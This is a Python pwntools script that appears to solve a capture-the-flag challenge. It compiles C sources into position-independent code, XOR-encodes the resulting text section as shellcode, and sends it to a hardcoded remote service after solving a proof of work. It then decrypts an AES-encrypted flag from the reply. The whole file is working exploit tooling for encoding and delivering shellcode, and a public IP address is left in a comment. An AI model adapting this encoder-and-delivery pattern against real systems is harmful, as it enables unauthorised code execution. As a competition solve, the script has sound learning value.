import pwn
import lief
import os
import base64
from Crypto.Cipher import AES
from elftools.elf.elffile import ELFFile
from encoder import encoder_with_xor_compress


def build_chall(name):
    os.system('gcc -Os -nostdlib -nodefaultlibs -fPIC %s.c'%name)

def chall_code():
    elf = ELFFile(open('./a.out', 'rb'))
    code_section = elf.get_section_by_name('.text')
    addr = code_section.header['sh_addr']
    code = code_section.data()
    entry = elf.header['e_entry']
    jmp_off = entry - addr + 2 + 3
    code = pwn.asm("jmp $+%d"%(jmp_off), arch='amd64') + code
    return code


def encode_shellcode(shellcode):
    e = encoder_with_xor_compress(shellcode=shellcode, base_reg="rdx", offset=0)
    return e

def chall(shellcode):
    p.recvuntil("code size")
    p.sendline(str(len(shellcode)))
    p.send(shellcode)

def build_code(name):
    build_chall(name)
    code = chall_code()
    shellcode = encode_shellcode(code)
    return shellcode


c1 = build_code("chall1")
c2 = build_code("chall2")
c3 = build_code("chall3")

#cache shellcode

#with open("s1", 'wb') as fp:
#    fp.write(c1)
#with open("s2", 'wb') as fp:
#    fp.write(c2)
#with open("s3", 'wb') as fp:
#    fp.write(c3)

#with open("s1", 'rb') as fp:
#    c1 = fp.read()
#with open("s2", 'rb') as fp:
#    c2 = fp.read()
#with open("s3", 'rb') as fp:
#    c3 = fp.read()

pwn.context.log_level = "debug"
#p = pwn.process('../build/noj', cwd="../build")
#p = pwn.remote('43.155.59.185', 1337)
p = pwn.remote('192.168.219.233', 1337)

def dopow():
    p.recvuntil('/pow.py solve ')
    pow_data = p.recvline()[:-1]

    pow_r = pwn.process("python3 ./pow.py solve %s"%(pow_data.decode()), shell=True)

    pow_r.recvuntil('Solution: \n')
    pow_result = pow_r.recvline()

    p.send(pow_result)

# remove for local
dopow()

chall(c1)
chall(c2)
chall(c3)

# decrypto flag
p.recvuntil("key: ")
key = p.recvline()[:-1]


p.recvuntil("iv: ")
iv = p.recvline()[:-1]


p.recvuntil("your data: ")
flag_data = p.recvline()[:-1]

p.recvuntil("flag noise: ")
noise = p.recvline()[:-1]


noise_list = noise.split()
flag_data = base64.b64decode(flag_data)

f = []

for a, b in zip(flag_data, noise_list):
    a -= int(b)
    if a < 0:
        a += 0x100
    if a > 0x100:
        a -= 0x100
    f.append(a)


adj_flag_data = bytes(f)
adj_key = base64.b64decode(key)
adj_iv = base64.b64decode(iv)

print(flag_data.hex())
print(adj_flag_data.hex())

aes = AES.new(adj_key, AES.MODE_CBC, adj_iv)
print(aes.decrypt(adj_flag_data))

p.interactive()
